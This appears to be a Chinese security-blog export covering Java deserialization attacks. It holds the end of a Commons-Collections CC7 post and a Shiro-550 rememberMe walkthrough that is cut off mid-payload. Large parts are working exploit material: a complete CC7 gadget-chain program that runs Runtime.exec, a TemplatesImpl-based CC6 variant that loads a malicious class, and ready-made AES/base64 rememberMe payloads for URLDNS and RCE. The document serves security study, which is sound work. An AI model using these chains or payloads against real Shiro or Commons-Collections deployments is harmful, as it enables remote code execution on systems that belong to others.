<p><font style="color:rgb(51, 51, 51);">还有一个是我们</font><code>AbstractMap.equals()</code><font style="color:rgb(51, 51, 51);">中个数需要相同。</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<h3 id="aCemO">在 map2 中remove掉 yy</h3>
<font style="color:rgb(80, 80, 92);">这是因为</font><font style="color:rgb(80, 80, 92);"> </font>`HashTable.put()`<font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">实际上也会调用到</font><font style="color:rgb(80, 80, 92);"> </font>`equals()`<font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">方法：</font>

<p><font style="color:rgb(80, 80, 92);">当调用完 </font><code>equals()</code><font style="color:rgb(80, 80, 92);"> 方法后，LazyMap2 的 key 中就会增加一个 yy 键：</font></p>
<h3 id="x6x4z"><font style="color:rgb(80, 80, 92);">put时弹计算器</font></h3>
虽然这不影响我们的序列化，但是总归是不好的，需要修改一下



<h2 id="xC9Rs">最终EXP</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.review;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">1</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;ChainedTransformer&gt; chainedTransformerClass = ChainedTransformer.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> chainedTransformerClass.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734804558818-e8d82acc-d43c-4a72-86fb-ee0723feb6ac.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro550</title>
    <url>/2025/03/03/Shiro550/</url>
    <content><![CDATA[<h1 id="DDElR">Shiro550</h1>
今天我们精进shiro的反序列化！！！

<p>之前有做过相关的shiro550与721的复现，不过都是利用工具的，没有理解里面的原理</p>
<p>550的话是由于他的密钥是固定的，是可以爆破的，经过Base64和AES解密以后，可以将里面的内容构造为恶意代码，从而达到RCE的目的</p>
<h2 id="BsFWJ">发现</h2>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735016085510-9edb1422-d5d2-49dc-8581-9dbd995c1e4e.png"></p>
<p>在登录界面有remember me的选项，勾选后点击登录抓包</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735016156894-ad6d98f6-4148-4301-a05e-ee9553b17993.png"></p>
<p>rememberMe字段中会有这么一大段东西，说明里面是存储着某些信息的，这些信息可以让我们下次不需要再次登录。我们这里可以去源码中看看进行了什么样的操作呢</p>
<p>在源码中找到了一个<code>CookieRememberMeManager</code>，应该就是它在管理这个Rememberme</p>
<p>在这个地方，将数据包中的cookie取出来进行base64解码，后返回解码的东西，我们看看谁调用了它</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735017435925-423b66ff-6436-4124-a8ce-89c401a24119.png"></p>
<p>找到在<code>getRememberedPrincipals</code>中调用了这个方法，将解码出来的字节，放入<code>convertBytesToPrincipals</code>方法中，我们跟进看一下（看名字就知道跟认证有关）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">        <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">            <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">            <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">            principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> principals;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个方法内，对所传入的字节进行一个<strong>解密</strong>，然后将<strong>反序列化</strong>后的它返回了回去</p>
<p>这里的解密函数就是AES解密，反序列化也是调用了原生的readObject</p>
<p>如果说它带了cc的依赖，我们就可以打它的cc依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">            bytes = decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>大概流程如下，反序列化的点就在convertBytesToPrincipals中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735018432588-cfe2debb-3ab5-4284-9f48-7b899ffcc280.png"></p>
<h2 id="SVcDS">攻击方式</h2>
<h3 id="nAXKz">URLDNS</h3>
由于shiro有cc依赖，但是在代码中没有import，所以cc的依赖没有办法打，我们先来验证一下，去打jdk自己的URLDNS链子

<p>先生成一个可用域名</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735019488981-1f10d404-cdc6-4cc4-9ccd-48234e27562a.png"></p>
<p>再去生成一个URLDNS链子的payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735019972386-7f641648-f410-43c1-8cb8-22e6be86b96e.png"></p>
<p>后续我们需要用脚本，对生成的payload进行AES加密，再进行base64加密（生成payload如下）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GVpWKjIkTESUwYXtKFTtzBwv5gw1KjohG6Q1RBnlOtMF5aGvp6FnFFlyMyPhmvdWFyL8TLw8e34+65Sw3+c0jq0qop8ubQQtcAjHdZu2T6Nfleg7g7/sA0gOyaUCRpR5WYkqDo4/GxFwM2Qn22t0Dx6GogH20i0g19gGsHWT1Ng1LTa0TgvHKJvVT8L8wCWKh5RRncVyFLmVM6OUDuroPjw2NNIKspmj2RGD6yMCSBe3fon6nfFXnctFYO4oT7wxmL+3EKZ55HKdCRVXr4nlYnh+MU1KS9KUuuMrhdUFOCNHEcVEV7IXLBBXCwjM1yibRCgzXSGGojxNqvAO1wl4JeIRLLsVvzMbeokSS14xcmHPLQC25TmcdfgcFr91zWGDUg7zPR+8R/uCZf2hK/YoqFSKy6bqFYjuENfZ2YDbZTCZBk+tIF6YDcbkOU4eVnbaZRAmJMY2PR+fEPKzNcaZlkY720KjGE6G0YRCvLC+hUE=</span><br></pre></td></tr></table></figure>

<p>将paload放入数据包中的<strong>reMeberMe</strong>中，shiro就会对他进行反序列化操作从而触发URLDNS</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735024319706-e7e6fa38-06bc-489d-a916-a896ab265ea4.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735024405834-d70b431e-773e-4f89-9fc2-f6a1c7d952d3.png"></p>
<h3 id="SqMdJ">CC攻击链</h3>
<h4 id="E5WRm">环境配置</h4>
这里我们用cc3.2.1来搭建这个环境

<p>我们先来使用cc6来打一下这个shiro环境，看一下它是一个怎么样的效果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GjDw1BVbSzeG2ZRTiqsafqN5Woprm2vK0ocyatebZYZCU5Wu30PTYzojzumFhnlTQ5GTyzlGh+Pm3PL5pBzTdQNVgwBoa7PqqUh9oqU2IIJymF2XMaQPVq513mugvjFZ8ZC2UoHDaFvlDRUToAtLqcJpfUoRq52Gvx8v1fB9GyJm5iZSLfXMmXDznYPVltvFvdePbi0eXj2K/85Zq89TCfsfVU5h2vAwP4XiTkZAlJgaXbR3FuFDpDZbKHaMRMdN5dCVT0nqHuCX/kIayuy7AfiMJRIt+sW0EFSX8S8T6Xcs/mCPtqvsiI0Kuxxl5oJq1fDRAf/QX8ovcUPiH0JK76llM+xtfkq4CrzoaY+NFp6lYOTXKN9PU+sjcioO/3BODMqmjg0clQHQV4ici3uIJ2C18V9AiZIK8S/NBhbi+0pjDECD5iErgGF5EGvdl4D85+R8GwxX8qwykGokzno6hwfyPMe9+UdvTn1rjsIroPjhETlyOZNzFlqu8Zj1K52JydgbceL1F35RjKWJzGc7dEBzmJmQ6Cahd6ICdgLRImlBYr62LZM18CXqB9naxJ4lbekq4R1zCQ8KKhpqWaAYXaL2jBsVympOss2I/uB4DQGYBVYBNowkwFlG3/O3zlDz+G60BVUR4cQnNwWqAnEWTSgS7ZGWaCfQW4T3gg4Gv5ZuuvEek9Kwi+h4e6bcrHEq6A+WTlrgb0XS40yQF2bwleEeNggdwpTrGbjd3pLUCa00Tn/yWLzzuN/6TwpANBHDfEB3RrPdaQSNu7YOGPSe4xEH3l+sSJMuULdwr/Two0TDOU1E/X9Y0wJ0crm0d7MIkvnHfqk6SGtyUTVYfo2c81sSWuB/6AQL0L9eYVozGWkl6h9Ap4lYckTuI5L1i7klVSSqcl++P0W26RrDTcVUs0YHTQc0KoPcrjrJm6jvJjz8RqiaClyrGIBL3kuSmmOWPZWT9V9CPhpz0n08i402ZdcVJOAhYAPk3B6P1t4ViPl0gcUP/hUt/acHMnhZGqNSRO5lgTambJg4d+bH9HUky19NXu3jb4jM9vauu6lqcmG87x97/uOA4EJRcGf2iFZO+6k96gRhUY/AJ0O5aE8veJhwnyPzaCaJzAdQlp4kQrWG0dvhKLhLHwdjOkrvBmERfxN58fpQDl82VHrV76+8jTIDFUZxzr/a/7IIqpmimcK9gsv7dBKP8nMRLoY64C0FR92FhRTcGcrGYc+NZpGK08aXZK1/eWqi9RgV2LY+lFn8f1Gl6QsIzy7H6zSw9GLq9r2EMR/DthiuPLBlOciFL50RVMit0Ts+wtSRmb3/3U97OP2zDEWeBNno0zRmCgrl0Mja1LbI1wtmYCFqHKbp1aRhCxKlHe94rkv8kpNpJwp3arAJckGZxRdhdr3MqL0JwQm0BOlfqyiGV4Z/LbczMIcut+OXRjma4nT8jIdFEwfVGc3a9OxU2x37F++ewCRl4jBr7+7N2f6KmN0JOLe21wsCm4pl0AKO6ZldfOeyZrQeo6SQ/44jxbQ/cg79vmV5<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="CdJT7">报错分析</h4>
将payload放入rememberMe后，服务器端爆出了一下错误，说无法加载Transformer这个类

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735025531998-d4316e0b-f014-4196-a7e1-34b0ac180998.png"></p>
<p>这里我们跟着源码去分析一下</p>
<p>这里找到报错的地方，这里它并不是调用了默认的字节输入流，而是调用了shiro自己写的一个<code>ClassResolvingObjectInputStream</code>，我们跟进去<code>ClassResolvingObjectInputStream</code>看一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">        <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> (T) ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            <span class="keyword">return</span> deserialized;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>ClassResolvingObjectInputStream</code>只有两个方法，一个构造方法我们就不看了，看一下另一个</p>
<p>这里的resolveClass的方法，是在<strong>反序列化</strong>时都会调用到的，在默认的<code>ObjectInputStream</code>也是有这个方法的，我们来对比一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735026166933-ce1f08e0-ac19-4016-8925-807be77b3869.png"></p>
<p>大概的差别就是<code>ClassResolvingObjectInputStream</code>调用的是<code>ClassUtils.forName(osc.getName());</code>，其中<code>ClassUtils</code>是shiro自定的一个工具类</p>
<p>而<code>ObjectInputStream</code>调用的是<code>Class.forName(name, false, latestUserDefinedLoader());</code></p>
<p>我们可以这样理解，Class.forName是可以对数组进行操作的，而ClassUtils.forName是不能对数组进行操作的，这就是报错的原因</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ClassResolvingObjectInputStream</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownClassException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="string">&quot;]: &quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ObjectInputStream</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">            <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> cl;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> ex;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h4 id="JFsrD">报错调整</h4>
<font style="color:rgb(50, 50, 50);">这里我们不能利用数组了，因为cc1中调用Runtime.exec需要用</font>`<font style="color:rgb(50, 50, 50);">ChainedTransformer</font>`<font style="color:rgb(50, 50, 50);">和</font>`<font style="color:rgb(50, 50, 50);">ConstantTransformer</font>`<font style="color:rgb(50, 50, 50);">来更正返回值，所以我们选用动态类加载去加载恶意类，大概流程如下</font>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735027682629-1aafb1a0-90c1-4c90-919b-1c05b87b61d5.png"></p>
<p>接下来我们去改写一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(entry, <span class="string">&quot;qwe&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(map2);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后老样子生成payload，放入remeberMe中（这个payload有点长，因为我们把整个类的东西都放进去了）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">z63yaT+pRKuWY/div9sA3wupuFtc2pvoYNv5xIQkya7wsuDr6wrIPxFV/ZjwFZiWaoQCvPy7TDK5+d+X8xkNocr08tLLfq7HMSSRFArD6F6S0+FcLzTXQpr2RiKCbmfV2i6vihz3ylcIhyHEn6XaUF7cKY5XNxjrrUxh2f1gsCGTX3NjU155fYuqM+ndqlh7/5140q9Fn0MIpWgZesq/eNfUYEA3iEcDv5VM+W5p/DDzvERg9rftFrzI60jkUZvxHqgF+LjLieNqbYMcZl0ah54n3IytkCfayN31QEqKxzqO8iHE7JNmPvzSclIZSuohjTHFLk+Um3Gh9MqMcgBeDrJFgP+KXkwIFCKTV7rEJku51b6WzXeOHrPAU07WSmoWnMZxasyVbGZSxkIj7SGdRZam+CtUt+1VtMtJvRP0J47R4js3SmvLFg5jy2ANNIuBxlemOsubsVlTbQM0bWjWm+bcX9cknFmCEtCT+chlqd7wAgoZmNm3E5UUAQKE4kTS4HLEUYpBkQrFg3NDqBx4i4Md7eMZvmBw0J8qlTLUIL1BYtBlo+g3Un3WPsmkDB3MUpcP7CBbwziwBfnzSgiC0eztsKGVb0FOO7ohs0qR9U6IodiqcwMvwmm+4Ts/i10cDj40VjhiNTYqIpEr0eo44/HSeR2BZHjMwTRM5z3W1o6bC8qtrlNxHqtClXzKGOtbZVJ2aeUe/fzU5EBiFx4joqhlfksS8pO0nEilUUPYaLd1UQ+JmozbIXxWnGRLk8eps3z+j6Lr4J9+rAgLbplTMrPF+avWO5OjonB3FCczFdXCysDahd4G/2CR599CYcHuAbHVOFEAQ56z3MdcIryqecxwUXQDGZF+8LqZX0N0AEwIjOLK2Xrto2dmkz0kgwU2lNn/fb8fusO1K4jV+lfGkB7Xvbu3EUS0WlK1jGBo/ORgIuxnRdi7TI1fYbMhxq5uwVlnlYLY7mtQSCtyEKqexn1h88fR4yrHAKD9JzhUP0J5Zxnpqndv0zOkV5U8rXM3lv0dwh7/WuHAypsGD5243nQmxDOwhYJSio/tx6IV77HJgaSVqQRUPte+ijoZ6hMAujEVkHFRuT+Nc1F+E7tj3Jd0akQ227Xoww5o7V1IzVGf+GfkSB8uCDfXT37T+1IsE8LPsMV9smrNcQ8BGQUONjgvtkVR4c6wO8ROUEFaJWaSl6taG82ULGQpJwfjvI8f9Gwg+wdnXO6P6IQZZlf830u9wCMDvU+aSpV+uKHuxpsvELZ3mceTZJbTaR3eQr8C8HDgM95r6pvDopVUFDoTXEXfygWa3vg4ObNXRogYAAu/X9XRuomozqMyrj/alu3acxNyLxeU9gV1O+K9kGMu4wTckcvvAUNR66qGw07jUVGWcMB5NJh6tOHXs7Tnz4gT1gkGf/6evQC1zrZNC4J4VCEJSFQ74J84hFmrx/quevaTLEW4D/7f4oJup6yb66CK973iu7gwC4ykD3bD8ib2r8wwHkWJ391B8Onf2OLwKJDnrF/qPZlxPOhJJObRY/Nq0BlKtb2Vu5D4ebVADzIKBkpZE4yWaOcqiIEzk01DH7UQiz+m59UNnHdGkCZP8rjLv6obRK1BEImjcxvPhg7oBIM45x1u3mFAh6X2VOFADsJOjRsp3obet0KutCwQY7hSdTVoR+fjNBAtKsPXXXsQVQ/+yJNB7UbkrnaqBxg3MOB5iw4zuCWCK3hSWP5EEDH2z5W145N68x3Z00wzutYJySe+mAAzWx6nyo1zO20v/bcB5OG+MjWjjqSupywC3y6ynLfQKGGouU5aa7rl8tLXuINFFqe+Ad6PRaZukJqOub8lDa/ZHbyYIRCVghmgpXMId9<span 